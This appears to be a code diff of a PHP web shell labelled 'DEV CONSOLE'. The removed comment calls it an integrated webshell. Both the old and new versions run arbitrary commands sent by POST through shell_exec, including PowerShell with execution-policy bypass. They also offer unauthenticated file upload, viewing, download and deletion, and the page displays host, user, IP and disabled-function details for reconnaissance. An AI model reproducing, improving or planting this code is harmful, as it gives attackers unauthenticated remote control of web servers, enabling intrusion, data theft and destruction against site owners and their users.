@@ -1,11 +1,5 @@
 <?php
-/**
- * DEV CONSOLE - INTEGRATED WEBSHELL (ENHANCED READABILITY)
- */
-
-error_reporting(0);
-putenv("PATH=C:\Windows\System32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\\");
-
+// ------------- CONFIG & INPUT --------------
 $cwd = $_POST['cwd'] ?? getcwd();
 $cmd = $_POST['cmd'] ?? '';
 $mode = $_POST['mode'] ?? 'shell';
@@ -13,24 +7,25 @@ $mode = $_POST['mode'] ?? 'shell';
 // Directory navigation
 if (isset($_GET['dir'])) {
     $new_dir = $_GET['dir'];
-    if (is_dir($new_dir)) { $cwd = realpath($new_dir); }
+    if (is_dir($new_dir)) {
+        $cwd = realpath($new_dir);
+    }
 }
 
-// File actions
+// File actions: view, delete, download (kept your original logic)
 if (isset($_GET['view'])) {
     $file = $_GET['view'];
     if (file_exists($file)) {
         header('Content-Type: text/plain; charset=utf-8');
-        readfile($file);
+        echo file_get_contents($file);
         exit;
     }
 }
 
 if (isset($_GET['delete'])) {
     $file = $_GET['delete'];
-    if (file_exists($file)) {
+    if (file_exists($file) && is_file($file)) {
         unlink($file);
-        echo "<p style='color:green;'>Deleted $file</p>";
     }
 }
 
@@ -44,175 +39,168 @@ if (isset($_GET['download'])) {
     }
 }
 
-// Upload handling
-if ($_FILES['upload']['tmp_name'] ?? false) {
-    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
-    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
-        echo "<p style='color:green;'>Uploaded " . htmlspecialchars($dest) . " (" . $_FILES['upload']['size'] . " bytes)</p>";
-    } else {
-        echo "<p style='color:red;'>Upload failed!</p>";
-    }
-}
-
+// Improved Command Execution for Windows/Linux
 function exec_command($cmd, $mode, $cwd) {
-    if (!$cmd) return 'Ready...';
+    if (!$cmd) return '';
+    
     $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
     
     if ($mode === 'powershell' && $isWin) {
-        $psPath = is_dir('C:\\Windows\\Sysnative') 
-            ? 'C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe' 
-            : 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
-            
+        // Use full path and bypass flags
+        $psPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
+        // We move to the directory first then run command
         $fullCmd = "cd /d \"$cwd\" && $psPath -NoProfile -ExecutionPolicy Bypass -NonInteractive -Command \"$cmd\" 2>&1";
+        return shell_exec($fullCmd);
     } else {
+        // Standard shell execution
         $prefix = $isWin ? "cd /d \"$cwd\" && " : "cd " . escapeshellarg($cwd) . " && ";
-        $fullCmd = $prefix . $cmd . ' 2>&1';
+        return shell_exec($prefix . $cmd . ' 2>&1');
     }
-    
-    return shell_exec($fullCmd) ?: "[System] No output returned.";
+}
+
+function sys_info() {
+    return [
+        'Hostname' => gethostname(),
+        'User' => get_current_user(),
+        'IP' => gethostbyname(gethostname()),
+        'OS' => PHP_OS,
+        'Path' => realpath($cwd),
+        'PHP' => PHP_VERSION,
+        'Disabled' => ini_get('disable_functions') ?: 'None'
+    ];
+}
+
+function list_files($dir) {
+    if (!is_dir($dir)) return [];
+    $files = scandir($dir);
+    return array_diff($files, ['.', '..']);
+}
+
+// Upload handling
+if ($_FILES['upload']['tmp_name'] ?? false) {
+    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
 }
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>DevConsole V1</title>
-    <style>
-        :root { 
-            --bg: #0f172a; --panel: #1e293b; --accent: #6366f1; 
-            --text: #f1f5f9; --green: #22c55e; --font-size: 16px; 
-        }
-        body { 
-            margin:0; font-family: 'Inter', 'Segoe UI', sans-serif; 
-            background: var(--bg); color: var(--text); height:100vh; 
-            display:flex; flex-direction: column; font-size: var(--font-size);
-        }
-        header { 
-            background: var(--panel); padding: 15px 25px; 
-            border-bottom: 2px solid #334155; display:flex; 
-            justify-content: space-between; align-items: center; 
-        }
-        .header-title { font-size: 1.4rem; font-weight: 800; letter-spacing: 1px; }
-        .badge { 
-            background: #000; padding: 6px 12px; border-radius: 6px; 
-            font-size: 14px; font-family: monospace; margin-left: 10px; 
-            color: var(--green); border: 1px solid #334155;
-        }
-        
-        main { flex: 1; display: flex; gap: 20px; padding: 20px; overflow: hidden; }
-        section { 
-            background: var(--panel); border-radius: 12px; padding: 20px; 
-            border: 1px solid #334155; overflow-y: auto; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
-        }
-        
-        #files { flex: 1.2; }
-        table { width: 100%; border-collapse: collapse; font-size: 15px; }
-        th { text-align: left; padding: 12px; border-bottom: 2px solid #475569; color: #94a3b8; font-size: 14px; text-transform: uppercase; }
-        td { padding: 12px; border-bottom: 1px solid #334155; font-family: 'Consolas', monospace; }
-        tr:hover { background: #2d3748; }
-        
-        .btn { text-decoration: none; padding: 6px 12px; border-radius: 6px; font-size: 13px; color: #fff; font-weight: 600; }
-        .btn-v { background: #3b82f6; } .btn-d { background: #10b981; } .btn-del { background: #ef4444; }
-        .folder { color: #fbbf24; text-decoration: none; font-weight: bold; font-size: 16px; }
+<meta charset="UTF-8" />
+<title>Dev Console</title>
+<style>
+  :root { --primary: #6366f1; --bg: #0f172a; --panel: #1e293b; --text: #f1f5f9; --green: #00ff88;}
+  body { margin:0; font-family: 'Inter', system-ui, sans-serif; background: var(--bg); color: var(--text); height:100vh; display:flex; flex-direction: column; }
+  header { background: var(--panel); padding: 10px 20px; border-bottom: 1px solid #334155; display:flex; justify-content: space-between; align-items: center; }
+  main { flex: 1; display: flex; gap: 1rem; padding: 1rem; overflow: hidden; }
+  section { background: var(--panel); border-radius: 12px; padding: 1.2rem; overflow-y: auto; border: 1px solid #334155; }
+  
+  #file-manager { flex: 1.2; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+  th { text-align: left; color: #94a3b8; padding: 0.8rem; border-bottom: 2px solid #334155; }
+  td { padding: 0.6rem 0.8rem; border-bottom: 1px solid #334155; font-family: monospace; }
+  tr:hover { background: #334155; }
+  
+  .action-btn { text-decoration: none; padding: 4px 8px; border-radius: 4px; font-size: 12px; color: white; margin-right: 4px; }
+  .view { background:#3b82f6; } .download { background:#10b981; } .delete { background:#ef4444; }
+  .folder { color: #f59e0b; font-weight: bold; text-decoration: none; }
+  .sys-badge {  background: #334155; padding: 5px 12px; border-radius: 6px; font-size: 14px; color: #00ff88; border: 1px solid #334155; margin-left: 10px;}
+  #terminal { flex: 1; display: flex; flex-direction: column; }
+  #output { flex: 1; background: #000; color: #10b981; padding: 1rem; border-radius: 8px; font-family: 'Consolas', monospace; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 1px solid #334155; }
+  
+  .input-group { display: flex; gap: 5px; margin-top: 10px; }
+  input[type="text"], select { background: #0f172a; border: 1px solid #334155; color: white; padding: 8px; border-radius: 4px; }
+  button { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
 
-        #term-sec { flex: 1; display: flex; flex-direction: column; }
-        #console { 
-            flex: 1; background: #000; color: var(--green); padding: 20px; 
-            border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; 
-            font-size: 16px; overflow-y: auto; white-space: pre-wrap; 
-            border: 1px solid #334155; line-height: 1.5;
-        }
-        .input-bar { display: flex; gap: 12px; margin-top: 20px; }
-        input[type="text"], select { 
-            background: #0f172a; border: 2px solid #475569; color: #fff; 
-            padding: 12px; border-radius: 8px; outline: none; font-size: 16px; 
-        }
-        input[type="text"]:focus { border-color: var(--accent); }
-        button { 
-            background: var(--accent); color: #fff; border: none; 
-            padding: 0 25px; border-radius: 8px; cursor: pointer; 
-            font-weight: bold; font-size: 16px; transition: 0.2s;
-        }
-        button:hover { background: #4f46e5; transform: translateY(-1px); }
-
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg); }
-        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 10px; }
-    </style>
+</style>
 </head>
 <body>
 
 <header>
-    <div class="header-title">⚡ DEV_CONSOLE <span style="font-weight: 200; font-size: 1rem;">v1.0</span></div>
-    <div>
-    	<span class="badge">Hostname: <?php echo gethostname(); ?></span>
-    	<span class="badge">User: <?php echo get_current_user(); ?></span>
-        <span class="badge">IP: <?php echo gethostbyname(gethostname()); ?></span>
-        <span class="badge" title="Full Path">Path: <?php echo realpath($cwd); ?></span>
-        <span class="badge">Srv: <?php echo explode(' ', $_SERVER['SERVER_SOFTWARE'])[0]; ?></span>
-    </div>
+  <div style="font-size:20px;"><strong><a href="<?=$_SERVER['PHP_SELF']?>" style="color:#fff;text-decoration:none;">⚡ DEV_CONSOLE</a></strong></div>
+  <div style="display:flex; gap:0px;">
+  <span class="sys-badge"><strong>Hostname:</strong> <?php echo gethostname(); ?></span>
+<span class="sys-badge"><strong>User:</strong> <?php echo get_current_user(); ?></span>
+<span class="sys-badge"><strong>IP:</strong> <?php echo gethostbyname(gethostname()); ?></span>
+<span class="sys-badge"><strong>OS:</strong> <?php echo PHP_OS; ?></span>
+<span class="sys-badge"><strong>Path:</strong> <?php echo realpath($cwd); ?></span>
+<span class="sys-badge"><strong>PHP:</strong> <?php echo PHP_VERSION; ?></span>
+<span class="sys-badge"><strong>Disabled:</strong> <?php echo ini_get('disable_functions') ?: 'None'; ?></span>
+  </div>
 </header>
 
 <main>
-    <section id="files">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-            <h3 style="margin:0; color: var(--accent);">📁 <?php echo htmlspecialchars($cwd); ?></h3>
-            <form method="post" enctype="multipart/form-data" style="display:flex; gap:10px;">
-                <input type="file" name="upload" style="font-size: 13px;">
-                <button type="submit" style="padding: 6px 15px; font-size:13px;">Upload</button>
-            </form>
-        </div>
-        <table>
-            <thead><tr><th>Name</th><th style="width:100px;">Size</th><th style="width:180px;">Actions</th></tr></thead>
-            <tbody>
-                <tr><td colspan="3"><a href="?dir=<?php echo urlencode(dirname($cwd)); ?>" class="folder"> .. / Parent Directory</a></td></tr>
-                <?php foreach(scandir($cwd) as $f): if($f=='.' || $f=='..') continue; $p=$cwd.DIRECTORY_SEPARATOR.$f; $d=is_dir($p); ?>
-                <tr>
-                    <td><?php echo $d ? "<a href='?dir=".urlencode($p)."' class='folder'>📂 $f</a>" : "📄 $f"; ?></td>
-                    <td><span style="color:#94a3b8"><?php echo $d ? 'DIR' : round(filesize($p)/1024, 1).' KB'; ?></span></td>
-                    <td>
-                        <?php if(!$d): ?>
-                            <a href="?view=<?php echo urlencode($p); ?>" target="_blank" class="btn btn-v">View</a>
-                            <a href="?download=<?php echo urlencode($p); ?>" class="btn btn-d">Get</a>
-                            <a href="?delete=<?php echo urlencode($p); ?>&dir=<?php echo urlencode($cwd); ?>" class="btn btn-del" onclick="return confirm('Delete?')">Del</a>
-                        <?php endif; ?>
-                    </td>
-                </tr>
-                <?php endforeach; ?>
-            </tbody>
-        </table>
- 	<div style="padding: 10px 15px; border-top: 1px solid #334155; background: rgba(0,0,0,0.1);">
-        <span style="font-family: monospace; font-size: 13px; color: #94a3b8;">
-            <strong>Sysinfo:</strong> <?php echo php_uname('a'); ?>
-        </span>
-    	</div>
-    </section>
-
-    <section id="term-sec">
-        <h3 style="margin-top:0; color: var(--accent);">Terminal Output</h3>
-        <div id="console"><?php 
-            if($cmd) {
-                echo "Executing: $cmd\n";
-                echo str_repeat("=", 50) . "\n";
-                echo htmlspecialchars(exec_command($cmd, $mode, $cwd));
-            } else { echo "Terminal ready for input..."; }
-        ?></div>
-        <form method="post" class="input-bar">
-            <select name="mode">
-                <option value="shell" <?php echo $mode=='shell'?'selected':''; ?>>CMD</option>
-                <option value="powershell" <?php echo $mode=='powershell'?'selected':''; ?>>PowerShell</option>
-            </select>
-            <input type="text" name="cmd" placeholder="Type a command (e.g. dir, whoami, ipconfig)..." style="flex:1;" autofocus autocomplete="off">
-            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
-            <button type="submit">Execute</button>
+  <section id="file-manager">
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+        <h3 style="margin:0;">Path: <?php echo htmlspecialchars($cwd); ?></h3>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="upload" style="font-size:14px;">
+            <button type="submit" style="padding:4px 8px; font-size:14px;">Upload</button>
         </form>
-    </section>
+    </div>
+    <hr style="border:0; border-top:1px solid #334155; margin:15px 0;">
+    <table>
+      <thead>
+        <tr><th>Name</th><th>Size</th><th style="text-align:center">Actions</th></tr>
+      </thead>
+      <tbody>
+        <?php
+          $parent = dirname($cwd);
+          echo "<tr><td colspan='3'><a href='?dir=" . urlencode($parent) . "' class='folder'>[ .. ]</a></td></tr>";
+          foreach(list_files($cwd) as $file):
+            $path = $cwd . DIRECTORY_SEPARATOR . $file;
+            $is_dir = is_dir($path);
+        ?>
+        <tr>
+          <td>
+            <?php if($is_dir): ?>
+              <a href="?dir=<?php echo urlencode($path); ?>" class="folder">📁 <?php echo htmlspecialchars($file); ?></a>
+            <?php else: ?>
+              📄 <?php echo htmlspecialchars($file); ?>
+            <?php endif; ?>
+          </td>
+          <td><?php echo $is_dir ? '--' : round(filesize($path)/1024, 2) . ' KB'; ?></td>
+          <td style="text-align:center">
+            <?php if(!$is_dir): ?>
+              <a href="?view=<?php echo urlencode($path); ?>" target="_blank" class="action-btn view">View</a>
+              <a href="?download=<?php echo urlencode($path); ?>" class="action-btn download">Get</a>
+              <a href="?delete=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($cwd); ?>" onclick="return confirm('Delete?')" class="action-btn delete">Del</a>
+            <?php endif; ?>
+          </td>
+        </tr>
+        <?php endforeach; ?>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="terminal">
+    <h3 style="margin-top:0;">Terminal</h3>
+    <pre id="output"><?php 
+        if ($cmd) {
+            echo "Directory: $cwd\n";
+            echo "Command: $cmd\n";
+            echo "--------------------------------------------------\n";
+            echo htmlspecialchars(exec_command($cmd, $mode, $cwd)); 
+        } else {
+            echo "Waiting for command...";
+        }
+    ?></pre>
+    <form method="post" class="input-group">
+        <select name="mode">
+          <option value="shell" <?php if($mode==='shell') echo 'selected'; ?>>CMD / Bash</option>
+          <option value="powershell" <?php if($mode==='powershell') echo 'selected'; ?>>PowerShell</option>
+        </select>
+        <input type="text" name="cmd" style="flex:1" placeholder="Enter command..." autofocus>
+        <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
+        <button type="submit">Execute</button>
+    </form>
+  </section>
 </main>
 
 <script>
-    const c = document.getElementById('console');
-    c.scrollTop = c.scrollHeight;
+    // Auto-scroll terminal to bottom
+    const out = document.getElementById('output');
+    out.scrollTop = out.scrollHeight;
 </script>
+
 </body>
 </html>
